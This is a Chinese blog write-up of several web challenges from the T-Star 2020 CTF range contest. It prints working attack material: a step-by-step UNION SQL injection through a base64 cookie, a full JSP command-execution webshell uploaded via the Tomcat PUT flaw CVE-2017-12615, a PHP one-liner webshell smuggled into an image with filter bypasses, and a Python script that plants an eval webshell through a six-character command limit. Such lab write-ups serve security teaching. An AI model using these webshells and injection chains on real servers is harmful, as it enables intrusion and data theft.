---
title: T-Star 2020 靶场赛 WriteUp
date: 2020-07-01 23:37:45
categories:
  - CTF
---

昨天开始的靶场赛，全是Web，除了最后两个SQL注入没做出来，其他全做出来了+复现出来了，这里记录几个比较有意思的题目。

<!-- more -->

## 你能爆破吗

![image-20200630140359446](https://images.hujiekang.top/blogimage-1b380797fcffb117960b33c62c4a0042-55021b07.png)

首页有个登录界面，随便输入会返回查询的语句，可以发现存在特殊字符转义没办法注入。于是尝试用户名和密码均输入admin，显示如下界面：

![image-20200630140620101](https://images.hujiekang.top/blogimage-699c7a68734979939e092fa5d15be5ff-5632138a.png)

发现服务器将刚才输入的用户名作为Cookie储存了起来，base64解密后是`admin`：

![image-20200630140750172](https://images.hujiekang.top/blogimage-334eccb561076dc5896ca31f3edd4563-0e1da001.png)

尝试改为`admin" or 1=1 limit 1,1#`，发现输出改变，说明存在SQL注入：

![image-20200630141041314](https://images.hujiekang.top/blogimage-226479b044c84e545ef0c9a25eff49cf-ed7ed74d.png)

于是使用联合注入，完整的注入过程如下：

```sql
SELECT * FROM users WHERE username="xxx" order by 2#
SELECT * FROM users WHERE username="xxx" order by 3#
SELECT * FROM users WHERE username="xxx" order by 4#  /* 报错 */
SELECT * FROM users WHERE username="xxx" union select 1,2,3#
SELECT * FROM users WHERE username="xxx" union select 1,database(),user()#    /* security, root@localhost */
SELECT * FROM users WHERE username="xxx" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#    /* emails,flag,referers,uagents,users */
SELECT * FROM users WHERE username="xxx" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='flag'#    /* id,flag */
SELECT * FROM users WHERE username="xxx" union select 1,group_concat(id),3 from flag#    /* flag{a405ef895ef46d96} */
```

最终发现`flag`表，查询得到flag。对应的payload为`eHh4IiB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQoaWQpLGdyb3VwX2NvbmNhdChmbGFnKSBmcm9tIGZsYWcj`

![image-20200630141712110](https://images.hujiekang.top/blogimage-193a586ef59964aa0369ee52ccdad840-b6a77f75.png)

flag：`flag{a405ef895ef46d96}`

## 小猫咪踩灯泡

> tomcat远程代码执行（CVE-2017-12615）

搜索了一下这个CVE，发现可以利用这个漏洞直接使用PUT方法上传文件。当`conf/web.xml`中的`readonly`参数为`false`时，就可以直接PUT上传文件和DELETE删除文件。再借助Windows系统的文件扩展名解析漏洞，可以实现webshell上传，具体文件的扩展名方式可以有如下几种：

- `shell.jsp%20`
- `shell.jsp::$DATA`
- `shell.jsp/`

更详细的复现过程可以看[这篇文章](https://xz.aliyun.com/t/5610)，CVE官方描述链接：<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12615>

题目首页打开，就是个小游戏，和题目没啥太大关系：

![image-20200630141712111](https://images.hujiekang.top/blogimage-bf1ecea96a6d5979ca4bb9daabdb1743-6f1ee283.jpg)

然后直接抓包用Burp打shell上去，测试的时候发现只有`shell.jsp/`这种方式，上传后才能够访问得到：

![image-20200630175702179](https://images.hujiekang.top/blogimage-579d1e7646adecfdd833e4f9e1613b82-171cd284.png)

这个jsp的RCE代码如下，这个是基于网上一个[带密码的版本](https://blog.csdn.net/darkhq/article/details/79302051)改的（不知道为什么要带密码参数），改成了不需要传密码的版本：

```jsp
<% @ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8" %>
<%!
    public static String excuteCmd(String c) {
        StringBuilder line = new StringBuilder();
        try {
            Process pro = Runtime.getRuntime().exec(c);
            BufferedReader buf = new BufferedReader(
                new InputStreamReader(pro.getInputStream()));
            String temp = null;
            while ((temp = buf.readLine()) != null) {
                line.append(temp+"\\n");
            }
            buf.close();
        } catch (Exception e) {
            line.append(e.getMessage());
        }
        return line.toString();
    }
%>
<%
    if(!"".equals(request.getParameter("cmd"))) {
        out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");
    } else {
        out.println(":-)");
    }
%>
```

传上去之后直接访问，使用`cat /flag.txt`打出flag：

![image-20200630180458688](https://images.hujiekang.top/blogimage-2d0c9b5557f4072318ee1feee7f6dbc7-a4bdd445.png)

flag：`flag{54e47be053bf6ea1}`

## 文件上传

题目描述是`文件上传str过滤`，首先想到双写和大小写。

首页是一个上传界面，测试之后发现只允许JPEG和GIF上传，且后端应该对文件头等信息进行了检测，不能单纯修改后缀名绕过。

于是使用`cmd`的`copy`命令，将一句话木马和图片文件压到一起：

![image-20200630185401708](https://images.hujiekang.top/blogimage-f310b4d0a29f37b7308f50433c432545-b138c7a9.png)

一开始是传了个普通的一句话，直接上传，下载上传后的文件发现图片被做了修改：

![image-20200630185934363](https://images.hujiekang.top/blogimage-d4badf8e08e942b734b061d1659b1239-810b2320.png)

于是猜测对`<?`、`php`、`eval`做了过滤。尝试双写`<<?? pphphp evevalal($_POST["aaa"]); ?>`，发现下载下来的图片中shell代码是完整的：

![image-20200630190728398](https://images.hujiekang.top/blogimage-ba255b250a3119f302c21e2cee46e8dd-7edef9f3.png)

然后上传文件，用Burp修改后缀，发现改大小写`.Php`没办法解析，`.php5`，`.php7`这样的后缀也都过滤掉了，最后试出来`.pht`可以顺利解析：

![image-20200630191344983](https://images.hujiekang.top/blogimage-dbdde72599db0391324d0374c8faf484-c9033fba.png)

于是连蚁剑，网站目录的上级中有`key`文件，直接拿到flag：

![image-20200630191418701](https://images.hujiekang.top/blogimage-ae4e56c9d4f764d1f1a74024b3aac954-b5f3550c.png)

flag：`flag{Aa3c7c37508E40B3}`

## 分析代码获得flag

打开获得源码：

```php
<?php
show_source(__FILE__);
error_reporting(0);
if(strlen($_GET[1])<7){
    echo shell_exec($_GET[1]);
}
?>
```

是一个限制了长度的命令执行，每一条命令最长6个字符。

### 第一种方法

比赛的时候有搜到一种使用重定向符创建文件，再利用`ls>文件名`将`ls`的结果写入另一个文件，再通过`sh`命令实现命令执行的方法，[传送门](https://xz.aliyun.com/t/2748)，首先是利用重定向符创建一个类似`ls -t>y`的脚本，然后就可以按文件创建时间来排序，写入数据就会方便得多（如果限制命令字符数为7上面就可以直接执行了，可是这里是6，所以要另外写个脚本）然后这个办法确实也是可行的，但是暂时没有可以用的服务器，所以就没弹成shell。。。最后参考了队友的解法，使用了base64加密的一句话木马，写上去然后直接蚁剑连接最后拿到flag。相当于执行了这些命令：

```bash
echo PD9waHAgZXZhbCgkX1BPU1RbZXZpbF0pOw==|base64 -d>1.php
# <?php eval($_POST[evil]);
```

`ls -t>y`脚本是这么搞出来的：

```bash
>l\\
>s\ \\
>-t\\
>\>y
ls>>_
# ls执行结果
# _  'l\'  's \'  '-t\'  '>y'
# cat _
# _
# l\
# s \
# -t\
# >y
```

实现了这个脚本，后面写别的东西也是差不多的原理，不过就简单多了，把要写的东西倒序执行，然后`ls -t`按时间顺序排列就是正确的东西了。然后上面的命令拆成下面这样：

```bash
>hp
>1.p\\
>\>\\
>-d\\
>4\ \\
>se6\\
>ba\\
>=\|\\
>Ow=\\
>F0p\\
>Zpb\\
>bZX\\
>U1R\\
>1BP\\
>gkX\\
>hbC\\
>ZXZ\\
>HAg\\
>9wa\\
>PD\\
>o\ \\
>ech\\
```

上面都执行一遍之后，执行一下`_`将写入一句话的脚本写入文件`sh _`，然后执行生成的文件`y`写入一句话木马`sh y`。

一个一个打比较费时间，直接写个脚本了：

```python
import requests
url = "http://xxxxxx/?1={}"

ls = [
	r">l\\",
    r">s\ \\",
    r">-t\\",
    r">\>y",
    r"ls>>_"
]

shell = [
    r">hp",
    r">1.p\\",
    r">\>\\",
    r">-d\\",
    r">4\ \\",
    r">se6\\",
    r">ba\\",
    r">=\|\\",
    r">Ow=\\",
    r">F0p\\",
    r">Zpb\\",
    r">bZX\\",
    r">U1R\\",
    r">1BP\\",
    r">gkX\\",
    r">hbC\\",
    r">ZXZ\\",
    r">HAg\\",
    r">9wa\\",
    r">PD\\",
    r">o\ \\",
    r">ech\\"
]

execute = {
    r"sh _",
    r"sh y"
}

for command in ls:
    r = requests.get(url.format(command))
    print(r.status_code, command)

for command in shell:
    r = requests.get(url.format(command))
    print(r.status_code, command)

for command in execute:
    r = requests.get(url.format(command))
    print(r.status_code, command)
```

跑完的效果如下：

![image-20200701230054402](https://images.hujiekang.top/blogimage-15d54da9f8fcc4f5cc158d58e83859e1-54fc79f0.png)

然后蚁剑连美汁汁儿：

![image-20200701230157098](https://images.hujiekang.top/blogimage-97e60d3e77936c299c6e6548a03cd55a-a00b7211.png)

![image-20200701230255244](https://images.hujiekang.top/blogimage-311a8c1fadf8a9fd3333b318d889c8d3-92b73d59.png)

### 第二种方法

赛后又通过啥都会的群友，学到了第二种姿势：<https://blog.csdn.net/nzjdsds/article/details/102940762>

这里面最关键的一步就是，在Linux shell下输入通配符`*`，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数。测试了一波，发现就是`ls`命令的顺序。当然在`*`后面再加参数也就相当于在`*`指代的命令后面追加参数了。

我做了一个测试，在当前目录写一个`xxx`文件，内容为123，在上一级目录写一个`yyy`文件，内容为456，然后利用重定向符写一个`cat`文件：

![image-20200701231325980](https://images.hujiekang.top/blogimage-e67a274cea9f9ea38e5f1ddc7e24192c-51e6e5b5.png)

输入`*`的效果如下，效果等价于`cat xxx`：

![image-20200701231407700](https://images.hujiekang.top/blogimage-ce6adb911e11ac82c3f310fad6597751-4d203834.png)

输入`* ../yyy`效果如下，效果等价于`cat xxx ../yyy`：

![image-20200701231612303](https://images.hujiekang.top/blogimage-3c92a54b61634262634a7c3a9230ce21-9729e9f4.png)

用在题目上同理，只需要先写一个`cat`文件，然后`* ../key`就可以读到上级目录的key文件了，当然这里有字符数限制，所以改成通配符`* ../*`：

![image-20200701232158795](https://images.hujiekang.top/blogimage-c2a98e049ffc4b421a31db8608d761d8-a733a4ac.png)

flag：`flag{a1c8BFF2}`

**其他师傅的wp：**

<https://0xfire.me/2020/06/30/T-Star高校挑战赛/>、<https://www.cnpanda.net/ctf/731.html>

**另：最后那道SQL2是某CTF的原题，改天把复现做了**
<https://github.com/XDSEC/xdsec_ctf/tree/494b53d388186e8be21e753bb2048362842280c1/xdctf2015/izyCTF>
